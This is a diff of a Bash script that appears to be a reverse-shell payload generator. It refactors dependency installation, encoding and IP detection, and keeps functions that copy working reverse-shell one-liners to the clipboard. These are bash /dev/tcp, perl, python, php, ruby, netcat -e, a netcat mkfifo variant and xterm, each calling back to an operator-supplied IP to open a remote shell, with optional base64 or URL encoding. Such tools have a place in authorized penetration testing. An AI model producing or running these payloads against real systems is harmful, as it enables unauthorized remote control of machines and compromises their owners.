@@ -33,87 +33,105 @@ ___________       .__ .__     _________.__             .__   .__
 " | lolcat -S '80'
 }
 
-function tools(){
-	tools=(xclip lolcat ifconfig urlencode)
-	for tool in ${tools[@]}; do
-	        command=$tool
-		case $command in
-        	        ifconfig) tool="net-tools";;
-			urlencode) tool="gridsite-clients";;
-	        esac
-		instalada=$(which $command > /dev/null; echo $?)
-		if [ $instalada == 0 ]; then
-			continue
-	        elif [ $instalada == 1 ]; then
-			echo -e "$yellow[!]$end Missing $command package: $tool"
-                        sudo apt install $tool -y > /dev/null 2>&1
-                        sleep 0.2
-		fi
+function tools() {
+  # Define the list of tools to check for.
+  tools=(xclip lolcat ifconfig urlencode)
 
-		instalada=$(which $command > /dev/null;  echo $?)
-		if [ $instalada == 0 ]; then
-			echo -e "$purple[*]$end Package: $tool installed successfully"; sleep 2.3
-		else
-			echo -e "$yellow[!]$end Instalation for $tool failed, try to install it manually using: "
-			echo -e "\tsudo apt install $red$tool$end"
-			exit 1
-		fi
-	done
+  # Define the mapping from tools to package names.
+  declare -A tool_packages=(
+    ["ifconfig"]="net-tools"
+    ["urlencode"]="gridsite-clients"
+  )
+
+  # Iterate over the list of tools.
+  for tool in ${tools[@]}; do
+    # Check if the tool is already installed.
+    if ! which $tool > /dev/null; then
+      # If not found determine the corresponding package name.
+      package_name=${tool_packages[$tool]:-$tool}
+
+      # Install the package using dpkg.
+      echo -e "$yellow[!]$end Missing $tool package: $package_name"
+      sudo apt install $package_name -y > /dev/null 2>&1
+
+      # Check if the installation was successful.
+      if which $tool > /dev/null; then
+        echo -e "$purple[*]$end Package: $package_name installed successfully"; sleep 2.3
+      else
+        echo -e "$yellow[!]$end Instalation for $package_name failed, try to install it manually using: "
+        echo -e "\tsudo apt install $red$package_name$end"
+        exit 1
+      fi
+    fi
+  done
 }
 
-function copy(){
-	if [ "$encode" ];then
-        	case $encode in
-			b64) shell=$(echo $1 | base64 -w 0);;
-			url) shell=$(urlencode -m $1);;
-	        esac
-	else
-		shell=$1
-	fi
-	echo $shell | xclip -sel clip && echo -e "\t\n$yellow[!]$end Shell copied on clipboard:"
-	echo -e "$purple$shell$end\n"
-	if [ $# -eq 2 ] && [ "$verbose" ]; then
-		echo -e "$turquoise$2$end"
-	fi
+# Encodes $1 (shell)
+function encode() {
+  case "$1" in
+    b64) echo "$2" | base64 -w 0;;
+    url) urlencode -m "$2";;
+  esac
 }
+
+function copy() {
+  # Encode the shell if $encode has value
+  local shell
+  if [ -n "$encode" ];then
+    shell=$(encode "$encode" "$1")
+  else
+    shell="$1"
+  fi
+
+  # Print the resoult and copy it into the clipboard
+  local message="\t\n$yellow[!]$end Shell copied on clipboard:\n$purple$shell$end\n"
+  echo -e "$message"
+  echo -n "$shell" | xclip -sel clip
+
+  # Shows more info if -v was specified
+  if [ $# -eq 2 ] && [ "$verbose" ]; then
+    echo -e "$turquoise$2$end"
+  fi
+}
+
 
 function bash(){
 	description="[?] Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10)"
-	copy "bash -i >& /dev/tcp/$ip/$port 0>&1" "$description"
+	copy "bash -i >& /dev/tcp/$IP/$port 0>&1" "$description"
 }
 
 function perl(){
 	description="[?] Here’s a shorter, feature-free version of the perl-reverse-shell"
-	copy "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" "$description"
+	copy "perl -e 'use Socket;\$i=\"$IP\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" "$description"
 }
 
 function python(){
 	description="[?] This was tested under Linux / Python 2.7"
-	copy "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" "$description"
+	copy "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" "$description"
 }
 
 function php(){
 	description="[?] This code assumes that the TCP connection uses file descriptor 3. If it doesn’t work, try 4, 5, 6…"
-	copy "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" "$description"
+	copy "php -r '\$sock=fsockopen(\"$IP\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" "$description"
 }
 
 function ruby(){
-	copy "ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+	copy "ruby -rsocket -e'f=TCPSocket.open(\"$IP\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
 }
 
 function nc(){
 	description="[?] Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option"
-	copy "nc -e /bin/sh $ip $port" "$description"
+	copy "nc -e /bin/sh $IP $port" "$description"
 }
 
 function nc2(){
 	description="[?] If you have the wrong version of netcat installed, you might still be able to get your reverse shell back like this"
-	copy "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f" "$description"
+	copy "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $port >/tmp/f" "$description"
 }
 
 function xterm(){
 	description="[?] One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you ($ip) on TCP port 6001."
-	copy "xterm -display $ip:1"
+	copy "xterm -display $IP:1"
 	echo -e "$blue[*]$end To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):"
 	echo -e "\n\t Xnest :1"
 	echo -e "\n$blue[*]$end You’ll need to authorise the target to connect to you (command also run on your host):"
@@ -132,7 +150,7 @@ function help(){
 }
 
 function choose(){
-        case $x in
+        case $s in
                 [0]* | [Bb]ash) bash;exit;;
                 [1]* | [Pp]erl) perl;exit;;
                 [2]* | [Pp]ython) python;exit;;
@@ -157,44 +175,40 @@ function selection(){
 }
 
 function checks(){
-
 	# Check that everything is installed
 	tools
 
-	# Extract IP from IFACE tun0
-	if [ -z "$ip" ];then
-		IFCONFIG=$(which ifconfig)
-		IFACE=$($IFCONFIG | grep tun0 | awk '{print $1}' | tr -d ':')
-		if [ "$IFACE" = "tun0" ];then
-			ip=$($IFCONFIG tun0 | grep "inet " | awk '{print $2}')
-		fi
-	fi
-
-	# Set a Default Port
-	if [ -z "$port" ];then
-		port="443"
-	fi
-
 	# Print help menu
-	if [ -z "$ip" ] || [ -z "$port" ];then
+	if [[ -z "$IP" ]] || [[ -z "$port" ]];then
 		help
 	fi
-
 }
 
 
-####### MAIN EXECUTION ######
+function getip(){
+	ifconfig=$(which ifconfig)
+	ip_regex="inet ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})"
+        	if [ "$($ifconfig tun0)" ];then
+			IP=$($ifconfig tun0 | grep -Eo "$ip_regex" | awk '{print $2}')
+		fi
+}
 
+####### Variables
+port=443
+getip
+
+
+####### MAIN EXECUTION ######
 while getopts i:p:s:e:hv opt; do
         case $opt in
-                i) ip=$OPTARG ;;
+		v) verbose="1";;
+                i) IP=$OPTARG ;;
                 p) port=$OPTARG ;;
-		s) x=$OPTARG ;;
+		s) s=$OPTARG ;;
 		e) encode=$OPTARG;;
 		h) help ;;
         esac
 done
-
 
 # Some cheks
 checks
@@ -202,16 +216,10 @@ checks
 # Banner
 banner
 
-# Cheks if verbose is true
-if [[ $* == *"-v"* ]];then
-	verbose="1"
-fi
-
 # Checks if a shell was specified if not prints a menu
-if [ -z "$x" ]; then
+if [[ -z "$s" ]]; then
 	selection
 fi
 
 # Select the shell that you want
 choose
-
